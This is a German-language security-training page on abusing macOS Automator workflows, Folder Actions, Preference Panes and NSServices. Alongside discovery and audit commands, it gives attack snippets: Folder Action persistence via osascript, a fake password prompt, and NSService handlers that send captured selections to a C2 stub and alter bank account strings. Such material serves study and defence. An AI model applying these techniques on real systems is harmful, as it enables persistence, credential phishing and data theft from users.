# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Grundlegende Informationen

**Automator** ist macOS' visuelles Automatisierungstool. Es führt **Workflows** (`.workflow` bundles) aus, die aus **Actions** (`.action` bundles) bestehen. Automator unterstützt außerdem **Folder Actions**, **Quick Actions** und die Integration von **Shortcuts**. Unter modernen macOS-Versionen können Workflows auch in **Shortcuts importiert** werden. Dadurch kann dieselbe schädliche Logik als Finder Quick Action, als Benutzerservice unter `~/Library/Services/` oder als Shortcut erscheinen, der auf älteren Automator Actions basiert.

Automator Actions sind **Plugins**, die beim Ausführen eines Workflows in die Automator-Laufzeitumgebung geladen werden. Sie können:
- Beliebige Shell-Scripts ausführen
- Dateien und Daten verarbeiten
- Über AppleScript mit Anwendungen interagieren
- Für komplexe Automatisierung verkettet werden

### Warum das wichtig ist

> [!WARNING]
> Automator Workflows können durch **Social Engineering** zur Ausführung gebracht werden – sie erscheinen als einfache Dokumentdateien. Ein `.workflow` bundle kann eingebettete Shell-Befehle enthalten, die beim Ausführen des Workflows ausgeführt werden. In Kombination mit Folder Actions ermöglichen sie eine **automatische Persistenz**, die durch Datei-Ereignisse ausgelöst wird. Aktuelle Gatekeeper-Fixes haben außerdem gezeigt, dass **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) als ausführbarer Inhalt und nicht als harmlose Daten behandelt werden müssen.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Ein `.workflow`-Bundle sieht für die meisten Benutzer wie eine normale Dokumentdatei aus:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Angriff: Folder Action Persistence

Folder Actions führen automatisch einen Workflow aus, wenn Dateien zu einem überwachten Ordner hinzugefügt werden:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions bleiben über Neustarts hinweg bestehen und werden unbemerkt ausgeführt. Eine Folder Action für `~/Downloads` bedeutet, dass **jede heruntergeladene Datei dein Payload auslöst** — einschließlich Dateien aus Safari, Chrome, AirDrop und E-Mail-Anhängen. Beachte außerdem, dass `System Events` Folder Actions registrieren kann, die auf Scripts außerhalb der standardmäßigen Speicherorte `~/Library/Scripts/Folder Action Scripts` verweisen. Daher lohnt sich die Suche nach losen Pfaden. Informationen zu den damit verbundenen TCC-Auswirkungen findest du auf [der TCC-Seite](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Grundlegende Informationen

Preference Panes (`.prefPane`-Bundles) sind Plugins, die von **System Settings** (früher System Preferences) geladen werden. Sie stellen Konfigurationsoberflächen für System- oder Drittanbieterfunktionen bereit. Auf älteren Systemen wurden sie direkt von `System Preferences` geladen; in neueren Releases werden Drittanbieter-Panes üblicherweise von einem **legacy loader XPC service** vermittelt, das von System Settings gestartet wird.

### Warum das wichtig ist

- Preference Panes werden in einem **vertrauenswürdigen Host-Prozess** ausgeführt, der von System Settings / System Preferences gestartet wird
- Auf modernen Systemen kann dieser Host ein **`legacyLoader` XPC service** sein. Die wichtige Grenze bleibt daher weiterhin **vertrauenswürdiger Apple-UI-Prozess -> Laden von Drittanbietercode**
- Drittanbieter-Preference-Panes übernehmen den **Sicherheitskontext des Host-Prozesses** sowie das mit dieser UI verbundene Benutzervertrauen
- Benutzer installieren Preference Panes durch **Doppelklicken** — ein einfaches Ziel für Social Engineering
- Nach der Installation bleiben sie **bestehen** und werden jedes Mal geladen, wenn System Settings dieses Panel öffnet

### Suche
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Ein bösartiger Preference Pane übernimmt den **Sicherheitskontext des Pane-Hosts** (historisch `System Preferences`, in neueren Versionen häufig ein von `System Settings` gestarteter `legacyLoader`-Helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Angriff: Persistenz durch Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Angriff: UI Phishing

Ein Preference Pane kann legitime System-UI-Panels nachahmen, um **Anmeldedaten zu phishen**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Grundlegende Informationen

**NSServices** ermöglichen es Anwendungen, anderen Apps über das **Services-Menü** (Rechtsklick → Services) Funktionen bereitzustellen. Wenn ein Benutzer Text oder Daten auswählt und einen Service aufruft, werden die ausgewählten Daten zur Verarbeitung an den **Service-Provider** gesendet.

Services werden im `Info.plist` einer Anwendung unter dem Schlüssel `NSServices` deklariert und beim Pasteboard-Server (`pbs`) registriert. macOS führt außerdem einen **Service-Cache** und eine **Restriction Policy**, die festlegen, welche Services sichtbar sind und ob sandboxed Aufrufer eine zusätzliche Warnung erhalten.

### Warum das wichtig ist

- Services erhalten einen **anwendungsübergreifenden Datenfluss** — ausgewählter Text aus jeder Anwendung wird an den Service gesendet
- Ein bösartiger Service erfasst Daten aus Passwort-Managern, E-Mail-Clients und Finanz-Apps
- Services können **veränderte Daten** an die aufrufende Anwendung zurückgeben (man-in-the-middle bei Auswahloperationen)
- Service-Namen können so gestaltet werden, dass sie legitim erscheinen ("Text formatieren", "Auswahl verschlüsseln", "Teilen")
- Das optionale `NSRestricted`-Flag ist sicherheitsrelevant: Ein als unrestricted markierter Service kann von einer sandboxed App ohne die Warnung aufgerufen werden, die macOS bei Services mit Escape-Risiko anzeigt<sup>[2]</sup>

### Aufklärung
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Angriff: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Angriff: Datenmodifikation (Man-in-the-Middle)

Ein Service kann die **zurückgegebenen Daten modifizieren**, während er den Anschein erweckt, eine legitime Funktion bereitzustellen:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Eingeschränkte Services & moderner Missbrauch

Apple unterstützt ein optionales boolesches `NSRestricted`-Feld pro Service-Definition. Wenn es gesetzt ist, warnt macOS sandboxed callers, da der Service ihnen möglicherweise helfen kann, **sandbox- oder Datenschutzgrenzen zu umgehen**. Aus offensiver Perspektive ergeben sich daraus zwei nützliche Audit-Pfade:

- Suche nach **Services von Drittanbietern, die nicht als restricted markiert sind**, obwohl sie Apple Events, Dateizugriffe oder andere privilegierte Aktionen weiterleiten
- Suche nach **hochwertigen integrierten Services** mit starken entitlements (zum Beispiel Services, die von Script Editor oder Finder-basierten Helfern bereitgestellt werden), und prüfe, ob Benutzerinteraktion ausreicht, um sie in eine primitive Datenzugriffsmöglichkeit umzuwandeln

Ein gutes aktuelles Beispiel ist **CVE-2022-48574**, bei dem der Services-Mechanismus missbraucht werden konnte, um **auf TCC-geschützte Benutzerdaten zuzugreifen, ohne den erwarteten Bestätigungsablauf**. Der Fehler ist behoben, aber die Technik bleibt für die Threat-Modellierung nützlich: Jeder Service, der Dateizugriffe oder Automatisierungsanfragen im Auftrag des Aufrufers weiterleitet, verdient dieselbe Prüfung.<sup>[2]</sup>

---

## Aktuelle Security-Hinweise

- **Quick Actions sind ausführbarer Inhalt**: Apple behob 2024 einen Gatekeeper-Bypass, bei dem eine in einer App gebündelte Automator Quick Action ohne die normale Prüfung ausgeführt werden konnte. Beim Audit von Apps sollte `Contents/PlugIns/*.workflow/Contents/document.wflow` genau wie Helferskripte oder Login Items untersucht werden. Siehe [die Gatekeeper-Seite](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
- **Shortcuts können das Legacy-Verhalten von Automator übernehmen**: Apple fügte außerdem eine zusätzliche Benutzerbestätigungsabfrage hinzu, nachdem festgestellt wurde, dass Shortcuts von Drittanbietern eine **Legacy-Automator-Action** verwendeten, um Apple Events ohne den erwarteten Berechtigungsablauf zu senden. Importierte Workflows und Shortcut-Bundles sollten auf `Run AppleScript`, `Run Shell Script` und ähnliche Bridge-Actions geprüft werden. Siehe [die TCC-Seite](../macos-security-protections/macos-tcc/README.md).
- **Automator ist weiterhin eine aktive Datenschutzgrenze**: Apple veröffentlichte 2025 einen weiteren Automator-Fix für den Zugriff auf geschützte Benutzerdaten. Auch wenn Automator eine Legacy-Oberfläche ist, sollte jeder Workflow Runner, Quick-Action-Host oder jede Automatisierungs-Bridge als aktuelle Angriffsfläche und nicht als toter Code behandelt werden.

---

## Angriffsketten über mehrere Techniken hinweg

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Einstellungsbereich → TCC-Eskalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Diebstahl aus dem Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referenzen

- [1] [Apple — Informationen zu den Sicherheitsinhalten von macOS Ventura 13.7, Sonoma 14.7 und Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Wie der NSServices-Exploit unter macOS funktionierte](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
